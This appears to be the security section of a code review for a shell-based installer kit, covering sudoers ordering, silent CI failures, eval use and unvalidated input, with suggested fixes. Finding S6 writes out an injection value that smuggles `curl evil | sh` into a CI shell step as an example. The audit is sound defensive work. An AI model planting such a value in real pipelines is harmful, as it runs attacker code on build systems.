## Security

| # | Sev | File(s) | Finding |
|---|-----|---------|---------|
| S1 | **MEDIUM** | `files/install.sh:1355-1359`, `management/update.sh:464-470`, `management/config.sh:383-385` | **sudoers is deployed before it is validated**: `chmod 440` + `ln -sf` into `/etc/sudoers.d/` happen *before* `visudo -c`. If validation fails the script exits 1 but a broken sudoers file stays active — potentially locking sudo itself (fixing it then requires non-sudo access). Fix: run `visudo -c -f` on the temp file first, only deploy after it passes (all three render sites). |
| S2 | **MEDIUM** | `scripts/security-scan.sh:35-36, 51` | **Advisory-watch fails silent-green**: `curl … \|\| true` → empty feed → `"upstream feed unreachable (offline or blocked) — nothing to do"` → `exit 0`. A permanently blocked proxy keeps CI green while the advisory watch is dead. This contradicts the repo's own fail-loud rule for maintainer automation (parse errors already `die` correctly). Fix: `die` on fetch failure; keep exit-0 only for a genuinely empty feed if that state is itself an alarm. |
| S3 | **MEDIUM** | `management/uninstall.sh:121-125` | `run() { … eval "$*" }` — violates the project's own no-`eval` rule (`docs/design/conventions.md`). Today every interpolated value is root-owned config (`install.conf`, `projects.conf` are root-only writable), so the current risk is latent — but the invariant protecting it is implicit, not enforced. Fix: replace `eval` with direct command invocation (like install.sh does). |
| S4 | LOW | `install.sh:1353`, `update.sh`, `config.sh` sudoers render | `DEFAULT_USER` charset is never validated before `sed`-interpolation into the sudoers file (and into `install.conf`, which gets sourced). Normal Unix usernames are safe; exotic names (e.g. LDAP-imported with spaces/`%`/`#`) could corrupt sudoers syntax. Fix: `case "$DEFAULT_USER" in *[!A-Za-z0-9_.-]*) abort;; esac` before rendering. |
| S5 | LOW | `sh/log.sh` (log_init) | Create-before-chmod window: `: > "$LOG_FILE"` creates the log with the process umask mode (kit umask 002 → 664, world-readable) before `chmod 640` runs seconds later. Fix: `install -m 640 /dev/null "$LOG_FILE"`. |
| S6 | **MEDIUM** | `.github/workflows/test-e2e.yml:208, 250`, `test-e2e-ddev.yml:186, 193` | **npm-registry-derived version interpolated into `run:` shell**: `OC2_VERSION` is extracted from the npm packument with only a prefix gate (`case 2.*`, test-e2e.yml:189/230) and then interpolated directly into a `run:` assignment word (`E2E_OC_VERSION=${{ … }} ./…`) and a `$GITHUB_STEP_SUMMARY` echo. A registry entry like `2.0.1"; curl evil \| sh; echo "` passes the prefix check and executes in the CI job (compromised npm package scenario). Fix: validate with an anchored `2.[0-9]+(\.[0-9]+)*` before writing `GITHUB_OUTPUT`, and pass the value via the step's `env:` block instead of `run:` interpolation. |

**Verified clean (no findings):** all four workflows carry `permissions:` blocks; no `pull_request_target`; no `${{ github.event.* }}` interpolated into `run:`; all downloads HTTPS with `-fsSL`; `py/jsonc-parser.py` / `py/tui-register.py` never shell out; TUI files render only (no `child_process`); hostnames from `.ddev/config.yaml` flow through argv only — the Windows hosts file is touched exclusively via the developer's ddev UAC flow.

- **ddev-hosts.sh:129 "grep command injection"** — an intermediate reasoning step suspected command substitution through `$(…)` arriving in `$dhmi_h`; the source analysis itself retracted this: parameter-expansion *values* are never re-evaluated by the shell, so there is no exec. The matching-semantics residue is now counted as C22 (verified empirically).
- **`py/__pycache__` tracked in git** — no `__pycache__` exists in the repo; ghost.

## User-reported (not a code finding)

- Review-process lesson, not a repository finding: the repo's own test scripts' `rm -rf` (traps, teardown in `tests/unit/*`) is harmless — it runs inside a single permitted `sh tests/…` invocation and never prompts. What actually caused repeated permission confirmations during this review: sub-agents building ad-hoc temp tests under `/tmp/opencode/…` and cleaning them up with a direct `cd /tmp/opencode && rm -rf {workdir}` tool call — every such `rm` requires a user confirmation. Addressed in the review workflow (cleanup via `mv` into the trash folder); no repo change required.

## Strengths worth keeping

1. **`scripts/security-scan.sh` `scan_advisory_valid`** — negated-class allowlist, severity vocabulary, anchored range regexes before any argv/query use; issue bodies go through `--body-file`, never argv. This is the reference implementation of the repo's own shell-security conventions.
2. **Wrapper conservatism** — `opencode-as-opencode` fails open/closed exactly where it should (advisory check fail-open, no container-backend fallback), and hostnames/URLs travel as argv only.
3. **mktemp discipline** — root context always uses `mktemp` (0600), sudoers content never world-readable, backup dirs 0700; sudoers rendered content is validated with `visudo -c` (ordering is the S1 issue, not the absence of validation).
4. **Test density and mechanical drift guards** — 1061+ checks, plus `test-kit-files.sh`/`test-workflows.sh` assert deploy lists and chmod lists mechanically; docs claims are wired to code in both directions.
